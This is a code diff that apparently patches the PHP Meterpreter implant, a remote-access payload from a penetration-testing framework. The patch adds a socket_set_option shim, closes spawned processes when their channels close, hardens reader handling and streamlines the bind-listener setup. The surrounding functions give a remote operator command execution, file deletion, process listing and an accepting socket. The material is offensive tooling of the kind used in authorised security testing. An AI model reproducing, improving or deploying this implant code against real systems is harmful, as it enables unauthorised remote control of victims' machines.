@@ -21,64 +21,12 @@ function file_get_contents($file) {
         return $contents;
 }
 }
-function hexdump($data, $htmloutput = false, $uppercase = false, $return = false)
-{
-    # Init
-    $hexi   = '';
-    $ascii  = '';
-    $dump   = ($htmloutput === true) ? '<pre>' : '';
-    $offset = 0;
-    $len    = strlen($data);
 
-    # Upper or lower case hexidecimal
-    $x = ($uppercase === false) ? 'x' : 'X';
-
-    # Iterate string
-    for ($i = $j = 0; $i < $len; $i++)  {
-        # Convert to hexidecimal
-        $hexi .= sprintf("%02$x ", ord($data[$i]));
-
-        # Replace non-viewable bytes with '.'
-        if (ord($data[$i]) >= 32) {
-            $ascii .= ($htmloutput === true) ?
-                            htmlentities($data[$i]) :
-                            $data[$i];
-        } else {
-            $ascii .= '.';
-        }
-        # Add extra column spacing
-        if ($j === 7) {
-            $hexi  .= ' ';
-            $ascii .= ' ';
-        }
-
-        # Add row
-        if (++$j === 16 || $i === $len - 1) {
-            # Join the hexi / ascii output
-            $dump .= sprintf("%04$x  %-49s  %s", $offset, $hexi, $ascii);
-
-            # Reset vars
-            $hexi   = $ascii = '';
-            $offset += 16;
-            $j      = 0;
-
-            # Add newline
-            if ($i !== $len - 1) {
-                $dump .= "\n";
-            }
-        }
-    }
-
-    # Finish dump
-    $dump .= $htmloutput === true ? '</pre>' : '';
-    $dump .= "\n";
-
-    # Output method
-    if ($return === false) {
-        echo $dump;
-    } else {
-        return $dump;
-    }
+# Renamed in php 4.3
+if (!function_exists('socket_set_option')) {
+function socket_set_option($sock, $type, $opt, $value) {
+    socket_setopt($sock, $type, $opt, $value);
+}
 }
 
 
@@ -336,6 +284,7 @@ function stdapi_fs_chdir($req, &$pkt) {
 }
 }
 
+# works
 if (!function_exists('stdapi_fs_delete')) {
 function stdapi_fs_delete($req, &$pkt) {
     my_print("doing delete");
@@ -507,8 +456,10 @@ function stdapi_sys_process_execute($req, &$pkt) {
         register_stream($pipes[1]);
         register_stream($pipes[2]);
 
-        $processes[] = $handle;
         $channels[] = $pipes;
+
+        # associate the process with this channel so we know when to close it.
+        $processes[count($channels) - 1] = $handle;
 
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, 0));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)-1));
@@ -523,10 +474,9 @@ function stdapi_sys_process_execute($req, &$pkt) {
 }
 
 # Works, but not very portable.  There doesn't appear to be a PHP way of
-# getting a list of processes, so we just shell out to ps.  I need to decide
-# what options to send to ps for portability and for information usefulness;
-# also, figure out a windows option -- tasklist.exe might work, but it doesn't
-# exist on older versions.
+# getting a list of processes, so we just shell out to ps/tasklist.exe.  I need
+# to decide what options to send to ps for portability and for information
+# usefulness.
 if (!function_exists('stdapi_sys_process_get_processes')) {
 function stdapi_sys_process_get_processes($req, &$pkt) {
     my_print("doing get_processes");
@@ -780,6 +730,7 @@ function core_channel_write($req, &$pkt) {
 }
 
 function core_channel_close($req, &$pkt) {
+    global $processes;
     # XXX remove the closed channel from $readers
     my_print("doing channel close");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
@@ -793,6 +744,10 @@ function core_channel_close($req, &$pkt) {
             if (array_key_exists($i, $c) && is_resource($c[$i])) {
                 close($c[$i]);
             }
+        }
+        if (array_key_exists($id, $processes)) {
+            @proc_close($processes[$id]);
+            unset($processes[$id]);
         }
         return ERROR_SUCCESS;
     }
@@ -819,7 +774,7 @@ function core_channel_interact($req, &$pkt) {
                 # stdout
                 add_reader($c[1]);
                 # stderr, don't care if it fails
-                if ($c[1] != $c[2] and !in_array($c[2], $readers)) {
+                if (array_key_exists(2, $c) && $c[1] != $c[2]) {
                     add_reader($c[2]);
                 }
                 $ret = ERROR_SUCCESS;
@@ -853,7 +808,8 @@ function core_channel_interact($req, &$pkt) {
 # we'll have ext_server_stdapi.php or whatever.  For now just return success.
 function core_loadlib($req, &$pkt) {
     my_print("doing core_loadlib (no-op)");
-    #$data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
+    $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
+    
     return ERROR_SUCCESS;
 }
 
@@ -1033,7 +989,7 @@ function packet_get_tlv($pkt, $type) {
                 $tlv['value'] = substr($pkt, $offset+8, $tlv['len']-8);
             }
             else {
-                #my_print("Wtf type is this? $type");
+                my_print("Wtf type is this? $type");
                 $tlv = null;
             }
             return $tlv;
@@ -1050,7 +1006,7 @@ function packet_get_tlv($pkt, $type) {
 function add_reader($resource) {
     global $readers;
     my_print("-- Adding {$resource} to readers");
-    if (!in_array($resource, $readers)) {
+    if (is_resource($resource) && !in_array($resource, $readers)) {
         array_push($readers, $resource);
     }
 }
@@ -1258,15 +1214,10 @@ if ($listen) {
 
     my_print("Listening on $port");
 
-    $setsockopt = 'socket_setopt';
-    if (!is_callable($setsockopt )) {
-        # renamed in PHP 4.3.0
-        $setsockopt = 'socket_set_option';
-    }
 
     $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
     # don't care if this fails
-    @$setsockopt($sock, SOL_SOCKET, SO_REUSEADDR, 1);
+    @socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
     $ret = socket_bind($sock, 0, $port);
     $ret = socket_listen($sock, 5);
     $msgsock = socket_accept($sock);
